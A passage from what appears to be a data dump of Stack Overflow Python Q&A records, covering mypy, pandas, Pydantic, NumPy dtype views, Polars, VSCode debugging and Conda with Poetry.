<p>There's currently an open issue asking for this (although it also wants the line length limit for docstrings and strings to be 79) <a href=""https://github.com/psf/black/issues/2289"" rel=""nofollow noreferrer"">GH-2289</a>, and specifically for docstrings <a href=""https://github.com/psf/black/issues/2865"" rel=""nofollow noreferrer"">GH-2865</a>. You can also read <a href=""https://github.com/psf/black/issues/1713"" rel=""nofollow noreferrer"">GH-1713</a> which is about splitting comments (and likewise has mixed feelings from maintainers).</p>
<p>For the time being, perhaps you can look into <a href=""https://github.com/PyCQA/docformatter"" rel=""nofollow noreferrer"">https://github.com/PyCQA/docformatter</a> which does seem to wrap docstrings (see the <code>--wrap-descriptions</code> and <code>--wrap-summaries</code> options)</p>
<hr />
<p><sup>P.S. if you're curious whether we'll add a flag to split docstrings or comments, it's once again unlikely since we seek to minimize formatting configurability. Especially as the pre-existing flags only disable certain elements of Black's style (barring --line-length which exists as there's no real consensus what it should be). Feel free to state your arguments in the linked issues tho!</sup></p>
"
"70938215","1","Why does mypy flag ""Item None has no attribute x"" error even if I check for None?","<p>Trying to do Python (3.8.8) with type hinting and getting errors from mypy (0.931) that I can't really understand.</p>
<pre class=""lang-py prettyprint-override""><code>import xml.etree.ElementTree as ET
tree = ET.parse('plant_catalog.xml')  # read in file and parse as XML
root = tree.getroot()  # get root node
for plant in root:  # loop through children
    if plant.find(&quot;LIGHT&quot;) and plant.find(&quot;LIGHT&quot;).text == &quot;sun&quot; 
        print(&quot;foo&quot;)
</code></pre>
<p>This raises the mypy error <code>Item &quot;None&quot; of &quot;Optional[Element]&quot; has no attribute &quot;text&quot;</code>.
But why? I do check for the possibility of <code>plant.find(&quot;LIGHT&quot;)</code> returning <code>None</code> in the first half of the if clause. The second part accessing the <code>.text</code> attribute isn't even executed if the first part fails.</p>
<p>If I modify to</p>
<pre class=""lang-py prettyprint-override""><code>    lights = plant.find(&quot;LIGHT&quot;)
    if lights:
        if lights.text == selection:            
            print(&quot;foo&quot;)
</code></pre>
<p>the error is gone.</p>
<p>So is this because the <code>plant</code> object might still change in between the first check and the second? But assigning to a variable doesn't automatically copy the content, its still just a reference to an object that might change. So why does it pass the second time?</p>
<p>(Yes, I know that repeating the <code>.find()</code> twice is also not time-efficient.)</p>
","70938396","<p><code>mypy</code> doesn't know that <code>plant.find(&quot;LIGHT&quot;)</code> always returns the same value, so it doesn't know that your test is a proper guard.</p>
<p>So you need to assign it to a variable. As far as mypy is concerned, the variable can't change from one object to another without being reassigned, and its contents can't change if you don't perform some other operation on it.</p>
"
"70669213","1","gyp ERR! stack Error: Command failed: python -c import sys; print ""%s.%s.%s"" % sys.version_info[:3]","<p>I'm trying to npm install in a Vue project, and even if I just ran vue create (name)
it gives me this err:</p>
<pre><code>npm ERR! gyp verb check python checking for Python executable &quot;c:\Python310\python.exe&quot; in the PATH
npm ERR! gyp verb `which` succeeded c:\Python310\python.exe c:\Python310\python.exe
npm ERR! gyp ERR! configure error
npm ERR! gyp ERR! stack Error: Command failed: c:\Python310\python.exe -c import sys; print &quot;%s.%s.%s&quot; % sys.version_info[:3];
npm ERR! gyp ERR! stack   File &quot;&lt;string&gt;&quot;, line 1
npm ERR! gyp ERR! stack     import sys; print &quot;%s.%s.%s&quot; % sys.version_info[:3];
npm ERR! gyp ERR! stack                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
npm ERR! gyp ERR! stack SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
npm ERR! gyp ERR! stack
npm ERR! gyp ERR! stack     at ChildProcess.exithandler (node:child_process:397:12)
npm ERR! gyp ERR! stack     at ChildProcess.emit (node:events:390:28)
npm ERR! gyp ERR! stack     at maybeClose (node:internal/child_process:1064:16)
npm ERR! gyp ERR! stack     at Process.ChildProcess._handle.onexit (node:internal/child_process:301:5)
npm ERR! gyp ERR! System Windows_NT 10.0.19044
npm ERR! gyp ERR! command &quot;C:\\Program Files\\nodejs\\node.exe&quot; &quot;C:\\Upwork\\contact_book\\node_modules\\node-gyp\\bin\\node-gyp.js&quot; &quot;rebuild&quot; &quot;--verbose&quot; &quot;--libsass_ext=&quot; &quot;--libsass_cflags=&quot; &quot;--libsass_ldflags=&quot; &quot;--libsass_library=&quot;
npm ERR! gyp ERR! cwd C:\Upwork\contact_book\node_modules\node-sass
npm ERR! gyp ERR! node -v v16.13.1
npm ERR! gyp ERR! node-gyp -v v3.8.0
npm ERR! gyp ERR! not ok
npm ERR! Build failed with error code: 1
</code></pre>
<p>I tried it in another PC but it is working fine, I think it is because I need to install something (since the PC is new)</p>
","70968862","<p>As @MehdiMamas pointed out in the comments, downgrading Node to v14 should solve the problem</p>
<pre><code>nvm install 14
nvm use 14
</code></pre>
"
"71535170","1","how to add elements of a list to elements of a row in pandas database","<p>i have this database  called db in pandas</p>
<pre><code> index     win  loss  moneywin  moneyloss
player1     5     1       300        100
player2    10     5       650        150
player3    17     6      1100       1050
player11  1010   105     10650      10150
player23  1017   106    101100     101050
</code></pre>
<p>and i want to add the elements of list1 to the elements of db</p>
<pre><code>list1 = [[player1,105,101,10300,10100],[player3,17,6,1100,1050]]
</code></pre>
<p>so the results would be db2</p>
<pre><code>index     win   loss   moneywin  moneyloss
player1   110    102   10600      10200
player2    10     5     650         150
player3    34     12    2200       2100
player11  1010   105   10650      10150
player23  1017   106   101100    101050
</code></pre>
<p>how can i go about it?</p>
","71535349","<p><strong>Solution 1:</strong></p>
<p>Create a dataframe from <code>list1</code> then <code>concat</code> it with the given dataframe then group by <code>index</code> and aggregate the remaining columns using <code>sum</code></p>
<pre><code>df1 = pd.DataFrame(list1, columns=df.columns)
df_out = pd.concat([df, df1]).groupby('index', sort=False).sum()
</code></pre>
<p><strong>Solution 2:</strong></p>
<p>Create a dataframe from <code>list1</code> then <code>add</code> it with the given dataframe using common <code>index</code></p>
<pre><code>df1 = pd.DataFrame(list1, columns=df.columns)
df_out = df.set_index('index').add(df1.set_index('index'), fill_value=0)
</code></pre>
<p>Result:</p>
<pre><code>print(df_out)

           win  loss  moneywin  moneyloss
index                                    
player1    110   102     10600      10200
player2     10     5       650        150
player3     34    12      2200       2100
player11  1010   105     10650      10150
player23  1017   106    101100     101050
</code></pre>
"
"71539448","1","Using different Pydantic models depending on the value of fields","<p>I have 2 Pydantic models (<code>var1</code> and <code>var2</code>). The input of the <code>PostExample</code> method can receive data either for the first model or the second.
The use of <code>Union</code> helps in solving this issue, but during validation it throws errors for both the first and the second model.</p>
<p>How to make it so that in case of an error in filling in the fields, validator errors are returned only for a certain model, and not for both at once? (if it helps, the models can be distinguished by the length of the field A).</p>
<p>main.py</p>
<pre><code>@app.post(&quot;/PostExample&quot;)
def postExample(request: Union[schemas.var1, schemas.var2]):
    
    result = post_registration_request.requsest_response()
    return result
  
  
</code></pre>
<p>schemas.py</p>
<pre><code>class var1(BaseModel):
    A: str
    B: int
    C: str
    D: str
  
  
class var2(BaseModel):
    A: str
    E: int
    F: str
</code></pre>
","71545639","<p>You could use <a href=""https://pydantic-docs.helpmanual.io/usage/types/#discriminated-unions-aka-tagged-unions"" rel=""noreferrer"">Discriminated Unions</a> (credits to @larsks for mentioning that in the comments). Setting a discriminated union, <em>&quot;validation is faster since it is only attempted against one model&quot;</em>, as well as <em>&quot;only one explicit error is raised in case of failure&quot;</em>. Working example below:</p>
<p><strong>app.py</strong></p>
<pre class=""lang-python prettyprint-override""><code>import schemas
from fastapi import FastAPI, Body
from typing import Union

app = FastAPI()

@app.post(&quot;/&quot;)
def submit(item: Union[schemas.Model1, schemas.Model2] = Body(..., discriminator='model_type')):
    return item
</code></pre>
<p><strong>schemas.py</strong></p>
<pre class=""lang-python prettyprint-override""><code>from typing import Literal
from pydantic import BaseModel

class Model1(BaseModel):
    model_type: Literal['m1']
    A: str
    B: int
    C: str
    D: str
  
class Model2(BaseModel):
    model_type: Literal['m2']
    A: str
    E: int
    F: str
</code></pre>
<p><strong>Test inputs - outputs</strong></p>
<pre><code>#1 Successful Response   #2 Validation error                   #3 Validation error
                                          
# Request body           # Request body                        # Request body
{                        {                                     {
  &quot;model_type&quot;: &quot;m1&quot;,      &quot;model_type&quot;: &quot;m1&quot;,                   &quot;model_type&quot;: &quot;m2&quot;,
  &quot;A&quot;: &quot;string&quot;,           &quot;A&quot;: &quot;string&quot;,                        &quot;A&quot;: &quot;string&quot;,
  &quot;B&quot;: 0,                  &quot;C&quot;: &quot;string&quot;,                        &quot;C&quot;: &quot;string&quot;,
  &quot;C&quot;: &quot;string&quot;,           &quot;D&quot;: &quot;string&quot;                         &quot;D&quot;: &quot;string&quot;
  &quot;D&quot;: &quot;string&quot;          }                                     }
}                                                              
                        
# Server response        # Server response                     # Server response
200                      {                                     {
                           &quot;detail&quot;: [                           &quot;detail&quot;: [
                             {                                     {
                               &quot;loc&quot;: [                              &quot;loc&quot;: [
                                 &quot;body&quot;,                               &quot;body&quot;,
                                 &quot;Model1&quot;,                             &quot;Model2&quot;,
                                 &quot;B&quot;                                   &quot;E&quot;
                               ],                                    ],
                               &quot;msg&quot;: &quot;field required&quot;,              &quot;msg&quot;: &quot;field required&quot;,
                               &quot;type&quot;: &quot;value_error.missing&quot;         &quot;type&quot;: &quot;value_error.missing&quot;
                             }                                     },
                           ]                                       {
                         }                                           &quot;loc&quot;: [
                                                                       &quot;body&quot;,
                                                                       &quot;Model2&quot;,
                                                                       &quot;F&quot;
                                                                     ],
                                                                     &quot;msg&quot;: &quot;field required&quot;,
                                                                     &quot;type&quot;: &quot;value_error.missing&quot;
                                                                   }
                                                                 ]
                                                               }
</code></pre>
<p>Alternative approach would be to attempt parsing the models (based on a discriminator you pass as query/path param), as described <a href=""https://stackoverflow.com/a/71228281/17865804"">here (Update 1)</a>.</p>
"
"71068392","1","Group and create three new columns by condition [Low, Hit, High]","<p>I have a large dataset (~5 Mio rows) with results from a Machine Learning training. Now I want to check to see if the results hit the &quot;target range&quot; or not. Lets say this range contains all values between <code>-0.25</code> and <code>+0.25</code>. If it's inside this range, it's a <code>Hit</code>, if it's below <code>Low</code> and on the other side <code>High</code>.</p>
<p>I now would create this three columns Hit, Low, High and calculate for each row which condition applies and put a <code>1</code> into this col, the other two would become <code>0</code>. After that I would group the values and sum them up. But I suspect there must be a better and faster way, such as calculate it directly while grouping.</p>
<hr />
<h2>Data</h2>
<pre><code>import pandas as pd

df = pd.DataFrame({&quot;Type&quot;:[&quot;RF&quot;, &quot;RF&quot;, &quot;RF&quot;, &quot;MLP&quot;, &quot;MLP&quot;, &quot;MLP&quot;], &quot;Value&quot;:[-1.5,-0.1,1.7,0.2,-0.7,-0.6]})

+----+--------+---------+
|    | Type   |   Value |
|----+--------+---------|
|  0 | RF     |    -1.5 | &lt;- Low
|  1 | RF     |    -0.1 | &lt;- Hit
|  2 | RF     |     1.7 | &lt;- High
|  3 | MLP    |     0.2 | &lt;- Hit
|  4 | MLP    |    -0.7 | &lt;- Low
|  5 | MLP    |    -0.6 | &lt;- Low
+----+--------+---------+
</code></pre>
<hr />
<h2>Expected Output</h2>
<pre><code>pd.DataFrame({&quot;Type&quot;:[&quot;RF&quot;, &quot;MLP&quot;], &quot;Low&quot;:[1,2], &quot;Hit&quot;:[1,1], &quot;High&quot;:[1,0]})

+----+--------+-------+-------+--------+
|    | Type   |   Low |   Hit |   High |
|----+--------+-------+-------+--------|
|  0 | RF     |     1 |     1 |      1 |
|  1 | MLP    |     2 |     1 |      0 |
+----+--------+-------+-------+--------+
</code></pre>
","71068494","<p>You could use <a href=""https://pandas.pydata.org/docs/reference/api/pandas.cut.html"" rel=""nofollow noreferrer""><code>cut</code></a> to define the groups and <a href=""https://pandas.pydata.org/docs/reference/api/pandas.pivot_table.html"" rel=""nofollow noreferrer""><code>pivot_table</code></a> to reshape:</p>
<pre class=""lang-py prettyprint-override""><code>(df.assign(group=pd.cut(df['Value'],
                        [float('-inf'), -0.25, 0.25, float('inf')],
                        labels=['Low', 'Hit', 'High']))
   .pivot_table(index='Type', columns='group', values='Value', aggfunc='count')
   .reset_index()
   .rename_axis(None, axis=1)
)
</code></pre>
<p>Or <a href=""https://pandas.pydata.org/docs/reference/api/pandas.crosstab.html"" rel=""nofollow noreferrer""><code>crosstab</code></a>:</p>
<pre><code>(pd.crosstab(df['Type'],
             pd.cut(df['Value'],
                    [float('-inf'), -0.25, 0.25, float('inf')],
                    labels=['Low', 'Hit', 'High'])
             )
   .reset_index().rename_axis(None, axis=1)
 )
</code></pre>
<p>output:</p>
<pre><code>  Type  Low  Hit  High
0  MLP    2    1     0
1   RF    1    1     1
</code></pre>
"
"70953743","1","Reinterpreting NumPy arrays as a different dtype","<p>Say I have a large NumPy array of <code>dtype</code> <code>int32</code></p>
<pre><code>import numpy as np
N = 1000  # (large) number of elements
a = np.random.randint(0, 100, N, dtype=np.int32)
</code></pre>
<p>but now I want the data to be <code>uint32</code>. I could do</p>
<pre class=""lang-py prettyprint-override""><code>b = a.astype(np.uint32)
</code></pre>
<p>or even</p>
<pre class=""lang-py prettyprint-override""><code>b = a.astype(np.uint32, copy=False)
</code></pre>
<p>but in both cases <code>b</code> is a copy of <code>a</code>, whereas I want to simply reinterpret the data in <code>a</code> as being <code>uint32</code>, as to not duplicate the memory. Similarly, using <code>np.asarray()</code> does not help.</p>
<p>What <em>does</em> work is</p>
<pre class=""lang-py prettyprint-override""><code>a.dtpye = np.uint32
</code></pre>
<p>which simply changes the <code>dtype</code> without altering the data at all. Here's a striking example:</p>
<pre><code>import numpy as np
a = np.array([-1, 0, 1, 2], dtype=np.int32)
print(a)
a.dtype = np.uint32
print(a)  # shows &quot;overflow&quot;, which is what I want
</code></pre>
<p>My questions are about the solution of simply overwriting the <code>dtype</code> of the array:</p>
<ol>
<li>Is this legitimate? Can you point me to where this feature is documented?</li>
<li>Does it in fact leave the data of the array untouched, i.e. no duplication of the data?</li>
<li>What if I want two arrays <code>a</code> and <code>b</code> sharing the same data, but view it as different <code>dtype</code>s? I've found the following to work, but again I'm concerned if this is really OK to do:
<pre class=""lang-py prettyprint-override""><code>import numpy as np
a = np.array([0, 1, 2, 3], dtype=np.int32)
b = a.view(np.uint32)
print(a)  # [0  1  2  3]
print(b)  # [0  1  2  3]
a[0] = -1
print(a)  # [-1  1  2  3]
print(b)  # [4294967295  1  2  3]
</code></pre>
Though this seems to work, I find it weird that the underlying <code>data</code> of the two arrays does not seem to be located the same place in memory:
<pre class=""lang-py prettyprint-override""><code>print(a.data)
print(b.data)
</code></pre>
Actually, it seems that the above gives different results each time it is run, so I don't understand what's going on there at all.</li>
<li>This can be extended to other <code>dtype</code>s, the most extreme of which is probably mixing 32 and 64 bit floats:
<pre class=""lang-py prettyprint-override""><code>import numpy as np
a = np.array([0, 1, 2, np.pi], dtype=np.float32)
b = a.view(np.float64)
print(a)  # [0.  1.  2.  3.1415927]
print(b)  # [0.0078125  50.12387848]
b[0] = 8
print(a)  # [0.  2.5  2.  3.1415927]
print(b)  # [8.  50.12387848]
</code></pre>
Again, is this condoned, if the obtained behaviour is really what I'm after?</li>
</ol>
","70990732","<blockquote>
<ol>
<li>Is this legitimate? Can you point me to where this feature is documented?</li>
</ol>
</blockquote>
<p>This is legitimate. However, using <code>np.view</code> (which is equivalent) is better since it is compatible with a static analysers (so it is somehow safer). Indeed, the <a href=""https://numpy.org/doc/1.22/reference/typing.html?highlight=dtype#ndarray"" rel=""noreferrer"">documentation</a> states:</p>
<blockquote>
<p>It’s possible to mutate the <code>dtype</code> of an array at runtime. [...]
This sort of mutation is not allowed by the types. Users who want to write statically typed code should instead use the <code>numpy.ndarray.view</code> method to create a view of the array with a different <code>dtype</code>.</p>
</blockquote>
<blockquote>
<ol start=""2"">
<li>Does it in fact leave the data of the array untouched, i.e. no duplication of the data?</li>
</ol>
</blockquote>
<p>Yes. Since the array is still a <strong>view</strong> on the same internal memory buffer (a basic byte array). Numpy will just reinterpret it differently (this is directly done the C code of each Numpy computing function).</p>
<blockquote>
<ol start=""3"">
<li>What if I want two arrays <code>a</code> and <code>b</code> sharing the same data, but view it as different <code>dtypes</code>? [...]</li>
</ol>
</blockquote>
<p><code>np.view</code> can be used in this case as you did in your example. However, the result is <em>platform dependent</em>. Indeed, Numpy just <a href=""https://numpy.org/doc/1.22/reference/generated/numpy.ndarray.view.html#numpy.ndarray.view"" rel=""noreferrer"">reinterpret bytes of memory</a> and theoretically the representation of negative numbers can change from one machine to another. Hopefully, nowadays, all mainstream modern processors use use the <a href=""https://en.wikipedia.org/wiki/Two%27s_complement"" rel=""noreferrer"">two's complement</a> (<a href=""https://en.wikipedia.org/wiki/Signed_number_representations"" rel=""noreferrer"">source</a>). This means that a <code>np.in32</code> value like <code>-1</code> will be reinterpreted as <code>2**32-1 = 4294967295</code> with a view of type <code>np.uint32</code>. Positive signed values are unchanged. As long as you are aware of this, this is fine and the behaviour is predictable.</p>
<blockquote>
<ol start=""4"">
<li>This can be extended to other <code>dtypes</code>, the most extreme of which is probably mixing 32 and 64 bit floats.</li>
</ol>
</blockquote>
<p>Well, put it shortly, <em>this is really like playing fire</em>. In this case this certainly <strong>unsafe</strong> although it may work on your specific machine. Let us venturing into troubled waters.</p>
<p>First of all, the documentation of <code>np.view</code> states:</p>
<blockquote>
<p>The behavior of the view cannot be predicted just from the superficial appearance of <code>a</code>. It also depends on exactly how <code>a</code> is stored in memory. Therefore if <code>a</code> is C-ordered versus fortran-ordered, versus defined as a slice or transpose, etc., the view may give different results.</p>
</blockquote>
<p>The thing is Numpy reinterpret the pointer using a C code. Thus, AFAIK, the <a href=""https://stackoverflow.com/questions/98650/what-is-the-strict-aliasing-rule"">strict aliasing rule</a> applies. This means that reinterpreting a <code>np.float32</code> value to a <code>np.float64</code> cause an <strong>undefined behaviour</strong>. One reason is that the alignment requirements are not the same for <code>np.float32</code> (typically 4) and <code>np.float32</code> (typically 8) and so reading an unaligned <code>np.float64</code> value from memory <strong>can cause a crash</strong> on some architecture (eg. POWER) although x86-64 processors support this. Another reason comes from the compiler which can over-optimize the code due to the strict aliasing rule by making wrong assumptions in your case (like a <code>np.float32</code> value and a <code>np.float64</code> value cannot overlap in memory so the modification of the view should not change the original array). However, since Numpy is called from CPython and no function calls are inlined from the interpreter (probably not with Cython), this last point should not be a problem (it may be the case be if you use Numba or any JIT though). Note that this is safe to get an <code>np.uint8</code> view of a <code>np.float32</code> since it does not break the strict aliasing rule (and the alignment is Ok). This could be useful to efficiently serialize Numpy arrays. The opposite operation is not safe (especially due to the alignment).</p>
<p><strong>Update about last section:</strong> a deeper analysis from the Numpy code show that some part of the code like <a href=""https://github.com/numpy/numpy/blob/f32f47d58e51111a9c995b2f53dab0d0bdb1c927/numpy/core/src/multiarray/lowlevel_strided_loops.c.src#L841"" rel=""noreferrer"">type-conversion functions</a> perform a safe type punning using the <code>memmove</code> C call, while some other functions like all basic <a href=""https://github.com/numpy/numpy/blob/f32f47d58e51111a9c995b2f53dab0d0bdb1c927/numpy/core/src/umath/fast_loop_macros.h#L135"" rel=""noreferrer"">unary operators</a> or <a href=""https://github.com/numpy/numpy/blob/f32f47d58e51111a9c995b2f53dab0d0bdb1c927/numpy/core/src/umath/fast_loop_macros.h#L205"" rel=""noreferrer"">binary ones</a> do not appear to do a proper type punning yet! Moreover, such feature is <em>barely tested</em> by users and tricky corner cases are likely to cause weird <em>bugs</em> (especially if you read and write in two views of the same array). Thus, <em>use it at your own risk</em>.</p>
"
"71048280","1","Upgrade python to 3.10 in windows; Do I have to reinstall all site-packages manually?","<p>I have in windows 10 64 bit installed python 3.9 with site-packages. I would like to install python 3.10.2 on windows 10 64 bit and find a way to install packages automatically in python 3.10.2, the same ones I currently have installed in python 3.9. I am also interested in the answer to this question for windows 11 64 bit.</p>
","71048281","<p>I upgraded to python 3.10.2 in windows 10 64 bit. To properly install the packages, install the appropriate version of the Microsoft Visual C++ compiler if necessary. Details can be read <a href=""https://wiki.python.org/moin/WindowsCompilers"" rel=""noreferrer"">https://wiki.python.org/moin/WindowsCompilers</a> . With the upgrade to python 3.10.2 from 3.9, it turned out that I had to do it, due to errors that are appearing during the installation of the packages. Before the installing python 3.10.2, type and execute the following command in the windows command prompt:</p>
<pre><code>pip freeze &gt; reqs.txt
</code></pre>
<p>This command writes to the reqs.txt file the names of all installed packages in the version suitable for pip. If you run the command prompt with administrator privileges, the reqs.txt file will be saved in the directory <code>C:\WINDOWS\system32</code>.</p>
<p>Then, after the installing of python 3.10.2 and the adding it to the paths in PATH, with the help of the command prompt you need to issue the command:</p>
<pre><code>pip install -r reqs.txt
</code></pre>
<p>This will start the installing of the packages in the same versions as for python 3.9. If problems occur, e.g. an installation error appears during the installation of lxml, then you can remove from the regs.txt file the entry with the name of the package whose installation is causing the problem and then install it manually. To edit the reqs.txt file you need the administrator privileges. The easiest way is to run the command prompt in the administrator mode, type reqs.txt and click Enter to edit it.</p>
<p>I decided later to update the missing packages to the latest version, because I suspected that with python 3.10.2 older versions were not compatible.
This means that when upgrading to python 3.10.2 it is worth asking yourself whether it is better to upgrade for all packages. To do this, you can generate the list of the outdated packages using the command:</p>
<pre><code>pip list –-outdated
</code></pre>
<p>After the printing of the list in the command prompt, you can upgrade the outdated packages using the command:</p>
<pre><code>pip install --upgrade &lt;package-name&gt;
</code></pre>
<p>This can be automated by the editing of the reqs.txt file and the changing of the mark == to &gt; which will speed up the upgrade. The mark &gt;  should only be changed for the outdated packages or you will get an error: &quot;Could not find a version that satisfies the requirement ... &quot;.</p>
<p>Supplement to virtual environments:</p>
<p>When you enter a virtual environment directory (in the windows command prompt):, such as <code>D:\python_projects\data_visualization\env\Scripts</code>, type activate to activate it. Then create the reqs.txt file analogous to the description above. Then, copy the file to a temporary directory. After this delete the virtual environment, e.g. using the windows explorator by the deleting of the contents of the <code>env</code> directory. Then, using the version of python in windows of our choice, create a virtual environment using the <code>env</code> directory (see: <a href=""https://docs.python.org/3/library/venv.html"" rel=""noreferrer"">https://docs.python.org/3/library/venv.html</a>). Copy the regs.txt file to the newly created <code>D:\python_projects\data_visualization\env\Scripts</code> directory. Install site-packages with the support of the regs.txt file as described above.</p>
"
"71560036","1","How to preform loc with one condition that include two columns","<p>I have df with two columns A and B both of them are columns with <strong>string values</strong>.</p>
<p>Example:</p>
<pre><code>df_1 = pd.DataFrame(data={
    &quot;A&quot;:['a','b','c'],
    &quot;B&quot;:['a x d','z y w','q m c'] #string values not a list
})
print(df_1)

#output
   A      B
0  a  a x d
1  b  z y w
2  c  q m c
</code></pre>
<p>now what I'm trying  to do is to preform loc in the df_1 to get all the row that col B cointain the string value in col A.</p>
<p>In this example the output i want is the first and the third rows:</p>
<pre><code>   A      B
0  a  a x d # 'a x d' contain value 'a'
2  c  q m c # 'q m c' contain value 'c'
</code></pre>
<p>I have tried different loc condition but got unhashable type: 'Series' error:</p>
<pre><code>df_1.loc[df_1[&quot;B&quot;].str.contains(df_1[&quot;A&quot;])] #TypeError: unhashable type: 'Series'
df_1.loc[df_1[&quot;A&quot;] in df_1[&quot;B&quot;]] #TypeError: unhashable type: 'Series'
</code></pre>
<p>I really don't want to use a for/while loop because of the size of the df.</p>
<p>Any idea how can I preform this?</p>
","71560089","<p>There is no vectorial method, to map <code>in</code> using two columns. You need to loop here:</p>
<pre class=""lang-py prettyprint-override""><code>mask = [a in b for a,b in zip(df_1['A'], df_1['B'])]

df_1.loc[mask]
</code></pre>
<p>Output:</p>
<pre><code>   A      B
0  a  a x d
2  c  q m c
</code></pre>
<h5>comparison of speed (3000 rows)</h5>
<pre><code># operator.contains
518 µs ± 4.61 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)

# list comprehension
554 µs ± 3.84 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)

# numpy.apply_along_axis
7.32 ms ± 58.8 µs per loop (mean ± std. dev. of 7 runs, 100 loops each)

# apply
20.7 ms ± 379 µs per loop (mean ± std. dev. of 7 runs, 10 loops each)
</code></pre>
"
"71106690","1","Polars: Specify dtypes for all columns at once in read_csv","<p>In <a href=""https://www.pola.rs/"" rel=""noreferrer"">Polars</a>, how can one specify a single dtype for all columns in <code>read_csv</code>?</p>
<p>According to the <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.read_csv.html#polars.read_csv"" rel=""noreferrer"">docs</a>, the <code>dtypes</code> argument to <code>read_csv</code> can take either a mapping (dict) in the form of <code>{'column_name': dtype}</code>, or a list of dtypes, one for each column.
However, it is not clear how to specify &quot;I want all columns to be a single dtype&quot;.</p>
<p>If you wanted all columns to be Utf-8 for example and you knew the total number of columns, you could do:</p>
<pre class=""lang-py prettyprint-override""><code>pl.read_csv('sample.csv', dtypes=[pl.Utf8]*number_of_columns)
</code></pre>
<p>However, this doesn't work if you don't know the total number of columns.
In Pandas, you could do something like:</p>
<pre class=""lang-py prettyprint-override""><code>pd.read_csv('sample.csv', dtype=str)
</code></pre>
<p>But this doesn't work in Polars.</p>
","71108347","<p>Reading all data in a csv to any other type than <code>pl.Utf8</code> likely fails with a lot of <code>null</code> values. We can use expressions to declare how we want to deal with those null values.</p>
<p>If you read a csv with <code>infer_schema_length=0</code>, polars does not know the schema and will read all columns as <code>pl.Utf8</code> as that is a super type of all polars types.</p>
<p>When read as <code>Utf8</code> we can use expressions to cast all columns.</p>
<pre class=""lang-py prettyprint-override""><code>(pl.read_csv(&quot;test.csv&quot;, infer_schema_length=0)
   .with_columns(pl.all().cast(pl.Int32, strict=False))
</code></pre>
"
"71019671","1","VSCode Python Debugger stops suddenly","<p>after installing Windows updates today, debugging is not working anymore.</p>
<p>This is my active debug configuration:</p>
<pre><code>&quot;launch&quot;: {
  &quot;version&quot;: &quot;0.2.0&quot;,
  &quot;configurations&quot;: [
    {
      &quot;name&quot;: &quot;DEBUG CURR&quot;,
      &quot;type&quot;: &quot;python&quot;,
      &quot;request&quot;: &quot;launch&quot;,
      &quot;program&quot;: &quot;${file}&quot;,
      &quot;console&quot;: &quot;internalConsole&quot;,
      &quot;justMyCode&quot;: false,
      &quot;stopOnEntry&quot;: false,
    }...
</code></pre>
<p>When I start the debugger, the menu pops up briefly for 1-2 seconds. But then it closes. There is no output in the console.</p>
<p>It does not stop at set breakpoints.</p>
<p>Does anybody have the same problem? Is there a solution?</p>
<h3>System settings</h3>
<ul>
<li>OS: Microsoft Windows 10 Enterprise (10.0.17763 Build 17763)</li>
<li>VSCode version 1.64.0</li>
<li>Python version: 3.8.11 (in the active Anaconda Environment)</li>
</ul>
<p>Installed VSCode extensions:</p>
<ul>
<li>Python (Microsoft) version: v2022.0.1786462952</li>
<li>Pylance (Microsoft) version: v2022.2.0</li>
</ul>
","71020430","<p>It's an issue with the latest Python Extension for VSCode.</p>
<p>Downgrading the python extension to v2021.12.1559732655 fixes the problem.</p>
<p><a href=""https://i.stack.imgur.com/mpU6G.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/mpU6G.png"" alt=""enter image description here"" /></a></p>
"
"71027193","1","DatetimeIndex.get_loc is deprecated","<p>I updated Pandas to 1.4.0 with yfinance 0.1.70.  Previously, I had to stay with Pandas 1.3.5 as Pandas and yfinance did't play well together.  These latest versions of Pandas and yfinance now work together, BUT Pandas now gives me this warning:</p>
<pre><code>Future Warning: Passing method to DatetimeIndex.get_loc is deprecated... Use index.get_indexer([item], method=...) instead
</code></pre>
<p>I had enough trouble as a novice Python person getting the original <code>get_loc</code> statement to work:</p>
<pre><code>last_week = format((df.index[df.index.get_loc(last_week, method='nearest')]).strftime('%Y-%m-%d'))
</code></pre>
<p>This statement allowed me to get a date from the dataframe that I could use further in determining the value associated with that date:</p>
<pre><code>week_value = df.loc[last_week, ans]
</code></pre>
<p>Truth be known, I am intimidated in trying to change this statement to be compliant with the new and improved <code>get_indexer</code> function.  Can someone help me out please?</p>
","71027209","<p>Should be pretty simple. Just change <code>get_loc(XXX, ...)</code> to <code>get_indexer([XXX], ...)[0]</code>:</p>
<pre><code>last_week = format((df.index[df.index.get_indexer([last_week], method='nearest')[0]]).strftime('%Y-%m-%d'))
</code></pre>
"
"70851048","1","Does it make sense to use Conda + Poetry?","<p>Does it make sense to use Conda + Poetry for a Machine Learning project? Allow me to share my (novice) understanding and please correct or enlighten me:</p>
<p>As far as I understand, <strong>Conda</strong> and <strong>Poetry</strong> have different purposes but are largely redundant:</p>
<ul>
<li>Conda is primarily a environment manager (in fact not necessarily Python), but it can also manage packages and dependencies.</li>
<li>Poetry is primarily a Python package manager (say, an upgrade of <strong>pip</strong>), but it can also create and manage Python environments (say, an upgrade of <strong>Pyenv</strong>).</li>
</ul>
<p>My idea is to use both and compartmentalize their roles: let Conda be the environment manager and Poetry the package manager. My reasoning is that (it sounds like) Conda is best for managing environments and can be used for compiling and installing non-python packages, especially CUDA drivers (for GPU capability), while Poetry is more powerful than Conda as a Python package manager.</p>
<p>I've managed to make this work fairly easily by using Poetry within a Conda environment. The trick is to not use Poetry to manage the Python environment: I'm not using commands like <code>poetry shell</code> or <code>poetry run</code>, only <code>poetry init</code>, <code>poetry install</code> etc (after activating the Conda environment).</p>
<p>For full disclosure, my <em>environment.yml</em> file (for Conda) looks like this:</p>
<pre><code>name: N

channels:
  - defaults
  - conda-forge

dependencies:
  - python=3.9
  - cudatoolkit
  - cudnn
</code></pre>
<p>and my <em>poetry.toml</em> file looks like that:</p>
<pre><code>[tool.poetry]
name = &quot;N&quot;
authors = [&quot;B&quot;]

[tool.poetry.dependencies]
python = &quot;3.9&quot;
torch = &quot;^1.10.1&quot;

[build-system]
requires = [&quot;poetry-core&gt;=1.0.0&quot;]
build-backend = &quot;poetry.core.masonry.api&quot;
</code></pre>
<p>To be honest, one of the reasons I proceeded this way is that I was struggling to install CUDA (for GPU support) without Conda.</p>
<p>Does this project design look reasonable to you?</p>
